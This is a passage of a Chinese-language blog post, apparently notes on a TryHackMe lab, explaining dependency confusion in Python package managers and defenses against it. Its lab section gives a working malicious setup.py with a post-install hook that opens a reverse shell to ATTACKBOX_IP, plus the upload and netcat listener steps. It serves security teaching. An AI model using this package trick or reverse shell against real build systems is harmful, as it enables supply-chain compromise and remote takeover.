+<p>内部依赖项的一个独特安全问题是存储。我们希望确保所有开发人员都可以访问依赖项以供使用，但不能修改。如果所有开发人员都可以简单地修改依赖项，那么攻击者只需攻击单个开发人员即可攻击多个应用程序。因此，我们需要保护对依赖项的写访问。在某些组织中，甚至限制读取访问以进一步减少攻击面。</p>
+<p>工具</p>
+<p>必须使用应用程序和工具来有效管理内部依赖项。这些工具会根据我们的需求而有所不同。如果我们只使用一种语言（例如 Python）开发代码，我们可以简单地托管一个内部 PyPi 存储库服务器。这将使我们能够上传和安装软件包，类似于使用 pip 和面向互联网的 PyPi 存储库执行的操作。</p>
+<p>但是，如果我们使用不同的语言开发应用程序，我们可能会选择使用依赖项管理器，例如 <a target="_blank" rel="noopener" href="https://jfrog.com/artifactory/">JFrog Artifactory</a>。JFrog Artifactory 允许集中管理依赖项并将其集成到 DevOps 管道中。当开发人员编写代码时，他们可以利用 Artifactory 上托管的各种依赖项。Artifactory 还能够管理内部使用的外部依赖项。它为所有依赖项提供了单一来源。</p>
+<p>虽然这些工具对于帮助我们内部管理依赖项非常有用，但如果它们受到损害，将导致重大影响。可以针对依赖管理器执行的一种此类攻击是依赖混淆，我们将在下一个任务中更详细地讨论它。</p>
+<h1 id="Theory-of-a-Dependency-Confusion"><a href="#Theory-of-a-Dependency-Confusion" class="headerlink" title="Theory of a Dependency Confusion"></a>Theory of a Dependency Confusion</h1><p>如果我们的组织使用通过依赖管理器管理的内部依赖项，则依赖项混淆是一种可能存在的漏洞。简而言之，攻击者可以创建竞争条件，这可能导致使用恶意依赖项而不是内部依赖项。在此任务中，我们将研究依赖项混淆漏洞的理论，然后在下一个任务中实际利用该漏洞。</p>
+<p>背景</p>
+<p>依赖项混淆是由 <a target="_blank" rel="noopener" href="https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610">Alex Birsan 于 2021 年</a> 发现的。该问题源于内部依赖项的管理方式。让我们看一个 Python 中的简单示例：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">pip install numpy</span><br></pre></td></tr></tbody></table></figure>
+
+<p>当我们运行此命令时，后台实际上发生了什么？当我们运行此命令时，pip 将连接到外部 PyPi 存储库以查找名为 numpy 的包，找到最新版本并安装它。过去，有一些有趣的方法可以通过供应链攻击来破坏此包：</p>
+<ul>
+<li><strong>域名抢注</strong> - 攻击者托管一个名为“nunpy”的包，希望开发人员会输错名称并安装他们的恶意包。</li>
+<li><strong>源注入</strong> - 攻击者通过拉取请求为包贡献新功能，但也在代码中嵌入了漏洞，该漏洞可用于破坏使用该包的应用程序。</li>
+<li><strong>域名到期</strong> - 有时，包的开发人员可能会忘记续订托管其电子邮件的域名。如果发生这种情况，攻击者可以购买过期的域名，从而完全控制电子邮件，这可用于重置包维护者的密码以获得对包的完全控制。这是这些外部存储库上的旧包的常见风险。</li>
+</ul>
+<p>还有其他几种供应链攻击方法，但它们都直接针对依赖项或其维护者。如果我们想使用 pip 安装内部包，并按照 <a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/55310229/pip-install-package-from-artifactory-and-install-dependencies-from-pypi">StackOverflow</a> 上的示例（就像所有优秀的开发人员一样），我们的构建步骤将如下所示：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">pip install numpy --extra-index-url https://our-internal-pypi-server.com/</span><br></pre></td></tr></tbody></table></figure>
+
+<p><code>--extra-index-url</code> 参数告诉 pip 应该检查额外的 Pypi 服务器以查找包。但是，如果 numpy 同时存在于内部存储库和外部面向公众的 PyPi 存储库中，该怎么办？pip 如何知道要安装哪个包？这很简单，它会从所有可用的存储库中收集包，比较版本号，然后安装版本号最高的包。您应该开始在这里看到问题。</p>
+<p>发起依赖混淆攻击</p>
+<p>攻击者真正需要发起内部依赖攻击的只是您的内部依赖项之一的名称。虽然这似乎是一个挑战，但它发生的频率比您预期的要高：</p>
+<ul>
+<li>开发人员经常在 StackOverflow 等公共论坛上提问，但不会混淆敏感信息，例如正在使用的库的名称，其中一些可能是内部依赖项。</li>
+<li>一些编译的应用程序（如 NodeJS）通常会在其 <code>package.json</code> 文件中披露内部包名称，该文件通常在应用程序本身中公开。</li>
+</ul>
+<p>一旦攻击者知道了内部依赖项的名称，他们就可以尝试在其中一个外部软件包存储库上托管一个名称相似但版本号更高的软件包。这将迫使任何试图构建应用程序并安装依赖项的系统在内部和外部软件包之间产生混淆，如果选择了外部软件包，攻击者的依赖项混淆攻击就会成功。完整的攻击如下图所示：</p>
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/32b158ecec6d8ed7fbad6d97630cc414.png" alt="Diagram for showing dependency confusion"></p>
+<p>注意事项</p>
+<p>有几件事需要牢记：</p>
+<ul>
+<li>由于我们只知道内部包的名称，而不知道包的实际源代码，因此如果我们执行依赖项混淆攻击，则管道的构建过程很可能会在后续步骤中失败，因为实际包未安装。</li>
+<li>我们的外部版本号必须高于内部包的版本号，混淆才能对我们有利。但是，这很容易，因为我们可以简单地使用版本号为 9000 的包，因为大多数包的主版本号都低于 10。</li>
+<li>依赖项混淆会影响任何类型的包，例如 Python pip 包、JavaScript npm 包或 Ruby gems 包。为简单起见，我们将通过 Python 演示攻击。</li>
+</ul>
+<p>让我们在下一个任务中看看如何实际执行依赖项混淆攻击。</p>
+<h1 id="Practical-Exploitation-of-Dependency-Confusion"><a href="#Practical-Exploitation-of-Dependency-Confusion" class="headerlink" title="Practical Exploitation of Dependency Confusion"></a>Practical Exploitation of Dependency Confusion</h1><p>从任务 4 中终止机器并启动连接到此任务的机器以执行依赖项混淆练习。如果您的 AttackBox 不再处于活动状态，您还必须重新部署它。我们必须模拟外部 Pypi 软件包存储库，因为上传恶意软件包违反了 Pypi 的服务条款。为了确保您可以访问此存储库和应用程序，请使用以下命令向您的 <code>/etc/hosts</code> 文件添加一个条目：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">sudo bash -c "echo '10.10.159.169 external.pypi-server.loc' &gt;&gt; /etc/hosts"</span><br></pre></td></tr></tbody></table></figure>
+
+<p>环境说明</p>
+<p>此机器模拟了具有以下内容的构建环境：</p>
+<ul>
+<li>内部依赖项管理器 - Pypi</li>
+<li>构建服务器 - Docker-Compose</li>
+</ul>
+<p>构建环境将每 5 分钟重建一次 API 应用程序。给机器几分钟启动时间后，您可以通过运行以下命令来验证 API 是否正常工作：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">curl http://10.10.159.169:8181/api/list</span><br></pre></td></tr></tbody></table></figure>
+
+<p>您应该看到 API 响应了一个数据集。如果您没有收到响应，请再等待 5 分钟，然后重试。</p>
+<p>依赖项披露</p>
+<p>应用程序的开发人员在公共论坛上发布了一个问题：</p>
+<p><em>将包上传到内部 Pypi 服务器</em></p>
+<p><em>大家好，我该如何将 pip 包上传到我们的内部 Pypi 服务器？我知道我会使用以下内容将其上传到外部，但我应该更改什么？</em></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">twine upload dist/datadbconnect-0.0.2.tar.gz</span><br></pre></td></tr></tbody></table></figure>
+
+<p><em>是否有标志或其他我可以添加的内容？</em></p>
+<p>在帖子中，开发人员似乎披露了一个内部包的名称，<strong>datadbconnect</strong>。这就是我们开始依赖混淆攻击所需的全部内容！</p>
+<p>安装步骤中的远程代码执行</p>
+<p>要发起依赖混淆攻击，我们需要开发和构建一个安装后会执行代码的恶意包。由于我们只知道包的名称，而无法访问源代码，因此应用程序在尝试运行我们的包时很可能会失败，因此我们最安全的做法是在流程早期获得远程代码执行。因此，我们希望在包安装完成后进行远程代码执行。</p>
+<p>这可能是解释如何从 Python 代码构建 Pip 包的好地方。如果您想更深入地探索该过程，请查看类似<a target="_blank" rel="noopener" href="https://www.freecodecamp.org/news/how-to-create-and-upload-your-first-python-package-to-pypi/">此</a> 的教程。这里我们将进行简要概述。最基本的 Pip 包需要以下结构：</p>
+<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">package_name/</span><br><span class="line">    package_name/</span><br><span class="line">    __init__.py</span><br><span class="line">    main.py</span><br><span class="line">    setup.py</span><br></pre></td></tr></tbody></table></figure>
+
+<ul>
+<li><strong>package_name</strong> - 这是我们正在创建的包的名称。在我们的例子中，它将是 datadbconnect</li>
+<li><strong><strong>init</strong>.py</strong> - 每个 Pip 包都需要一个 init 文件，该文件告诉 Python 这里有文件应该包含在构建中。在我们的例子中，我们将保留它为空。</li>
+<li><strong>main.py</strong> - 使用包时将执行的主文件。我们将创建一个非常简单的主文件。</li>
+<li><strong>setup.py</strong> - 这是包含构建和安装说明的文件。开发 Pip 包时，您可以使用 setup.py、setup.cfg 或 pyproject.toml。但是，由于我们的目标是远程代码执行，因此将使用 setup.py，因为它对于此目标来说是最简单的。</li>
+</ul>
+<p>为您的恶意包重新创建此文件夹结构。将以下代码添加到您的 main.py：</p>
+<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">   <span class="built_in">print</span> (<span class="string">"Hello World"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">   main()</span><br></pre></td></tr></tbody></table></figure>
+
+<p>这只是填充代码，用于确保包确实包含一些用于构建的代码。更重要的部分是 setup.py 代码。让我们看看正常的 setup.py 文件是什么样子的：</p>
+<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> setuptools <span class="keyword">import</span> find_packages</span><br><span class="line"><span class="keyword">from</span> setuptools <span class="keyword">import</span> setup</span><br><span class="line"></span><br><span class="line">VERSION = <span class="string">'v0.0.1'</span></span><br><span class="line"> </span><br><span class="line">setup(</span><br><span class="line">        name=<span class="string">'datadbconnect'</span>,</span><br><span class="line">        url=<span class="string">'https://github.com/labs/datadbconnect/'</span>,</span><br><span class="line">        download_url=<span class="string">'https://github.com/labs/datadbconnect/archive/{}.tar.gz'</span>.<span class="built_in">format</span>(VERSION),</span><br><span class="line">        author=<span class="string">'Tinus Green'</span>,</span><br><span class="line">        author_email=<span class="string">'tinus@notmyrealemail.com'</span>,</span><br><span class="line">        version=VERSION,</span><br><span class="line">        packages=find_packages(),</span><br><span class="line">        include_package_data=<span class="literal">True</span>,</span><br><span class="line">        license=<span class="string">'MIT'</span>,</span><br><span class="line">        description=(<span class="string">'''Dataset Connection Package '''</span></span><br><span class="line">                  <span class="string">'''that can be used internally to connect to data sources '''</span>),</span><br><span class="line">)</span><br></pre></td></tr></tbody></table></figure>
+
+<p>为了注入代码执行，我们需要确保包在安装后执行代码。幸运的是，我们用于构建包的工具 setuptools 具有内置功能，允许我们在安装后步骤中挂钩。这通常用于合法目的，例如在安装二进制文件后创建它们的快捷方式。但是，将其与 Python 的 os 库相结合，我们可以利用它来获得远程代码执行。使用以下内容更新您的 setup.py 文件：</p>
+<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> setuptools <span class="keyword">import</span> find_packages</span><br><span class="line"><span class="keyword">from</span> setuptools <span class="keyword">import</span> setup</span><br><span class="line"><span class="keyword">from</span> setuptools.command.install <span class="keyword">import</span> install</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">VERSION = <span class="string">'v9000.0.2'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PostInstallCommand</span>(<span class="title class_ inherited__">install</span>):</span><br><span class="line">     <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>):</span><br><span class="line">         install.run(self)</span><br><span class="line">         <span class="built_in">print</span> (<span class="string">"Hello World from installer, this proves our injection works"</span>)</span><br><span class="line">         os.system(<span class="string">'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKBOX_IP",8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\''</span>)</span><br><span class="line"></span><br><span class="line">setup(</span><br><span class="line">        name=<span class="string">'datadbconnect'</span>,</span><br><span class="line">        url=<span class="string">'https://github.com/labs/datadbconnect/'</span>,</span><br><span class="line">        download_url=<span class="string">'https://github.com/labs/datadbconnect/archive/{}.tar.gz'</span>.<span class="built_in">format</span>(VERSION),</span><br><span class="line">        author=<span class="string">'Tinus Green'</span>,</span><br><span class="line">        author_email=<span class="string">'tinus@notmyrealemail.com'</span>,</span><br><span class="line">        version=VERSION,</span><br><span class="line">        packages=find_packages(),</span><br><span class="line">        include_package_data=<span class="literal">True</span>,</span><br><span class="line">        license=<span class="string">'MIT'</span>,</span><br><span class="line">        description=(<span class="string">'''Dataset Connection Package '''</span></span><br><span class="line">                  <span class="string">'''that can be used internally to connect to data sources '''</span>),</span><br><span class="line">        cmdclass={</span><br><span class="line">            <span class="string">'install'</span>: PostInstallCommand</span><br><span class="line">        },</span><br><span class="line">)</span><br></pre></td></tr></tbody></table></figure>
+
+<p>让我们看看我们所做的调整。首先，我们从setuptools和os库中导入了install库：</p>
+<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> setuptools.command.install <span class="keyword">import</span> install</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br></pre></td></tr></tbody></table></figure>
+
+<p>我们还更新了软件包的版本，以确保我们赢得依赖混淆竞赛：</p>
+<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">VERSION = <span class="string">'v9000.0.2'</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>接下来，我们引入了一个新功能，它将作为安装后的钩子为我们运行反向 shell。记得添加你的 AttackBox 或 VPN IP：</p>
+<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">PostInstallCommand</span>(<span class="title class_ inherited__">install</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>):</span><br><span class="line">        install.run(self)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">"Hello World from installer, this proves our injection works"</span>)</span><br><span class="line">        os.system(<span class="string">'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKBOX_IP",8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\''</span>)</span><br></pre></td></tr></tbody></table></figure>
+
+<p>最后，我们将安装后过程挂接到安装配置中：</p>
+<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">cmdclass={</span><br><span class="line">        <span class="string">'install'</span>: PostInstallCommand</span><br><span class="line">    },</span><br></pre></td></tr></tbody></table></figure>
+
+<p>现在我们已经创建了包，是时候构建它并将其上传到外部 PyPI 存储库了。我们可以使用以下命令来构建我们的包：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">python3 setup.py sdist</span><br></pre></td></tr></tbody></table></figure>
+
+<p>一旦构建完成，我们的 Pip 包将在 dist 文件夹下可用，并且可以使用 twine 上传到 Pypi 仓库：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">twine upload dist/datadbconnect-9000.0.2.tar.gz --repository-url http://external.pypi-server.loc:8080</span><br></pre></td></tr></tbody></table></figure>
+
+<p>如果系统要求您提供凭据，请将其留空。只要最终输出显示包上传已达到 100%，您也可以安全地忽略错误和警告消息。再次提醒一下，我们正在模拟外部 PyPI 存储库，以免违反其服务条款。如果这是一次真正的攻击，则该包将被上传到 PyPI 的主要 <a target="_blank" rel="noopener" href="https://pypi.org/">存储库</a>。让我们为我们的 shell 启动一个监听器：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">nc -lvp 8080</span><br></pre></td></tr></tbody></table></figure>
+
+<p>我们可以通过直接安装来测试我们的包的代码执行情况：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">pip3 install datadbconnect --trusted-host external.pypi-server.loc --index-url http://external.pypi-server.loc:8080 --verbose</span><br></pre></td></tr></tbody></table></figure>
+
+<p>您应该会在安装命令的输出中看到打印行，并且看到 pip 在获得反向 shell 连接时冻结：</p>
+<p>AttackBox Terminal</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">[thm@thm]$ nc -lvp 8080</span><br><span class="line">Listening on 0.0.0.0 8080</span><br><span class="line">Connection received on localhost 50098</span><br><span class="line">$ whoami</span><br><span class="line">root</span><br></pre></td></tr></tbody></table></figure>
+
+<p>如果此方法有效，请重新启动侦听器并等待大约 5 分钟，一旦尝试重建 Docker 容器并安装我们的恶意包，您应该会神奇地从构建服务器收到回调！</p>
+<p>解释后台发生了什么</p>
+<p>那么这实际上是怎么发生的？让我们深入了解 DockerFile 中的易受攻击的行：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">RUN pip3 install datadbconnect --no-cache-dir --trusted-host internal.pypi-server.com --extra-index-url "http://internal.pypi-server:8081/simple/"</span><br></pre></td></tr></tbody></table></figure>
+
+<p>知道这是一个内部包，开发团队通过 <code>--extra-index-url</code> 参数为 Pip 添加了一个额外的 Pypi 存储库。但是，这不会强制 Pip 从该位置下载包。相反，它只是另一个可以查找包的位置。因此，Pip 将从 <em>internal.pypi-server.com</em>（合法包）和 <em>external.pypi-server.loc</em>（我们的恶意包）下载包，并比较两个版本。由于我们的版本更高，它将安装我们的包！这就是依赖混淆这个名字的由来！</p>
+<p>防御</p>
+<p>保护内部依赖关系是一项艰巨的安全工作。由于我们必须自己创建、维护和托管这些依赖关系，因此安全项目比外部依赖关系大得多。所有内部依赖关系都应考虑以下防御策略：</p>
+<ul>
+<li>应积极维护内部依赖关系。这将确保这些依赖关系中的漏洞不会影响多个应用程序和服务。</li>
+<li>应保护内部依赖关系的托管基础设施。以下 [Microsoft 白皮书](<a target="_blank" rel="noopener" href="https://azure.microsoft.com/mediahandler/files/resourcefiles/3-ways-to-mitigate-risk-using-private-package-feeds/3">https://azure.microsoft.com/mediahandler/files/resourcefiles/3-ways-to-mitigate-risk-using-private-package-feeds/3</a> Ways to Mitigate Risk When Using Private Package Feeds - v1.0.pdf) 提供了以下三个关键重点领域：</li>
+<li>引用一个私有源，而不是多个。这有助于防止依赖项混淆攻击。在我们的 Python 示例中，我们将使用 <code>--index-url</code> 参数而不是 <code>--extra-index-url</code> 来指示必须从指定索引收集包。</li>
+<li>使用受控范围保护您的包。通过控制依赖项的范围，它将确保依赖项被锁定到需要它们的应用程序。</li>
+<li>利用客户端验证功能。子资源完整性或版本锁定等控制将确保应用程序和服务能够检测到何时将恶意代码引入依赖项并拒绝执行它。</li>
+<li>作为防止依赖混淆攻击的额外防御措施，内部依赖项的名称可以在外部包管理器上注册，而无需源代码来声明该名称。这将阻止攻击者注册类似名称的包。</li>
+</ul>
+<h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>在这个房间里，我们讨论了依赖管理中常见的安全控制和错误配置。这绝不是依赖项安全性需要考虑的详尽列表。但是，总结一下，我们应该考虑以下几点：</p>
+<ul>
+<li>注意您在应用程序和系统中使用的依赖项。此外，请注意这些依赖项可能具有依赖项，这将增加您需要密切关注的依赖项列表。</li>
+<li>确保始终使用最新版本的依赖项，包括内部和外部依赖项。通常，这些依赖项的更新不是为了引入新功能，而是为了修复现有的问题和错误。</li>
+<li>不仅应该考虑依赖项本身的安全性，还应该考虑我们如何配置和使用依赖项管理器，尤其是对于内部依赖项。</li>
+<li>依赖项和依赖项管理系统应包含在我们正在开发的应用程序或系统的攻击面中。</li>
+</ul>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://blog.mikannse.cn">Mikannse</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://blog.mikannse.cn/2025/02/28/THMDependencyManagement/">https://blog.mikannse.cn/2025/02/28/THMDependencyManagement/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://blog.mikannse.cn" target="_blank">MikannseのSekai</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%AC%94%E8%AE%B0/">笔记</a><a class="post-meta__tags" href="/tags/DevSecOps/">DevSecOps</a></div><div class="post_share"><div class="social-share" data-image="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2025/02/03/25-1%E6%9D%82%E8%B0%88/" title="25-1杂谈"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">25-1杂谈</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2024/07/19/CSS%E9%9A%8F%E6%89%8B%E8%AE%B0/" title="CSS随手记"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-07-19</div><div class="title">CSS随手记</div></div></a></div><div><a href="/2024/06/15/AdvancedSQLInjectionTHM/" title="AdvancedSQLInjectionTHM"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-06-15</div><div class="title">AdvancedSQLInjectionTHM</div></div></a></div><div><a href="/2024/03/14/ContainerVulnerabilitiesTHM/" title="ContainerVulnerabilitiesTHM"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-14</div><div class="title">ContainerVulnerabilitiesTHM</div></div></a></div><div><a href="/2024/10/05/Git%E9%80%9F%E6%88%90/" title="Git速成"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-10-05</div><div class="title">Git速成</div></div></a></div><div><a href="/2024/07/11/HMVLabsTemperanceX00-10/" title="HMVLabsTemperanceX00-10"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-07-11</div><div class="title">HMVLabsTemperanceX00-10</div></div></a></div><div><a href="/2023/11/17/Cross-Site%20Scripting%20(XSS)HTB/" title="Cross-Site Scripting (XSS)HTB"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-17</div><div class="title">Cross-Site Scripting (XSS)HTB</div></div></a></div></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Valine</span><span class="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Mikannse</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">313</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">74</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/mikannse/mikannse.github.io"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">暂时没有公告QAQ</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Introduction"><span class="toc-number">1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#What-are-dependencies"><span class="toc-number">2.</span> <span class="toc-text">What are dependencies?</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Internal-vs-External"><span class="toc-number">3.</span> <span class="toc-text">Internal vs External</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Securing-External-Dependencies"><span class="toc-number">4.</span> <span class="toc-text">Securing External Dependencies</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Securing-Internal-Dependencies"><span class="toc-number">5.</span> <span class="toc-text">Securing Internal Dependencies</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Theory-of-a-Dependency-Confusion"><span class="toc-number">6.</span> <span class="toc-text">Theory of a Dependency Confusion</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Practical-Exploitation-of-Dependency-Confusion"><span class="toc-number">7.</span> <span class="toc-text">Practical Exploitation of Dependency Confusion</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Conclusion"><span class="toc-number">8.</span> <span class="toc-text">Conclusion</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/02/28/THMDependencyManagement/" title="THMDependencyManagement">THMDependencyManagement</a><time datetime="2025-02-28T12:59:01.000Z" title="发表于 2025-02-28 20:59:01">2025-02-28</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/02/03/25-1%E6%9D%82%E8%B0%88/" title="25-1杂谈">25-1杂谈</a><time datetime="2025-02-03T04:48:34.000Z" title="发表于 2025-02-03 12:48:34">2025-02-03</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/01/15/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E5%85%AD%E4%B9%9D)%E4%B9%8BVulnHubSNAKEOIL/" title="打靶记录(一六九)之VulnHubSNAKEOIL">打靶记录(一六九)之VulnHubSNAKEOIL</a><time datetime="2025-01-15T08:34:34.000Z" title="发表于 2025-01-15 16:34:34">2025-01-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/01/15/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E5%85%AD%E5%85%AB)%E4%B9%8BVulnHubEvilbox/" title="打靶记录(一六八)之VulnHubEvilbox">打靶记录(一六八)之VulnHubEvilbox</a><time datetime="2025-01-15T06:41:28.000Z" title="发表于 2025-01-15 14:41:28">2025-01-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/01/06/2024%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/" title="2024年度总结">2024年度总结</a><time datetime="2025-01-05T16:23:47.000Z" title="发表于 2025-01-06 00:23:47">2025-01-06</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://cdn.jsdelivr.net/gh/yjr-1100/Photobag/githubioimg/background_4k.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2025 By Mikannse</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat-btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: '',
+      appKey: '',
+      avatar: 'monsterid',
+      serverURLs: '',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
